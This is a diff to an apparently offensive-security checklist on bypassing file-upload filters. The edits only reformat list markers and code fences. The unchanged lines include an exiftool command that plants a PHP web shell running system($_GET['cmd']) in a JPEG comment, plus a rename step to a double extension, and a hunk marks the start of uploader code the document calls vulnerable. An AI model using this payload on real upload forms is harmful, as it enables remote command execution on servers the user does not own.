@@ -90,8 +90,8 @@
 	
 		<br></br>		    
         - [ ] Comment in jpg file Bypass<br></br>
-            > For file uploads which validate image size using php `getimagesize()`, it may be possible to execute shellcode by inserting it into the Comment attribute of Image 		    > properties and saving it as file.jpg.php.
-            > You can do this with gimp or exiftools:
+            - For file uploads which validate image size using php `getimagesize()`, it may be possible to execute shellcode by inserting it into the Comment attribute of Image 		    - properties and saving it as file.jpg.php.
+            - You can do this with gimp or exiftools:
 			```php
 			└─$ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
 			└─$ mv file.jpg file.php.jpg
@@ -210,7 +210,7 @@
         - - - -
     - # Vulnerable uploader code for mgic bytes:
         - [ ]  PHP code:
-            ```php
+          ```php
             <?php
             $allowed_image_types = false;
             $image_content = file_get_contents( 'image.png' );
@@ -230,7 +230,7 @@
                 }
             }
             ?>
-            ```
+          ```
         - - - -
     
         
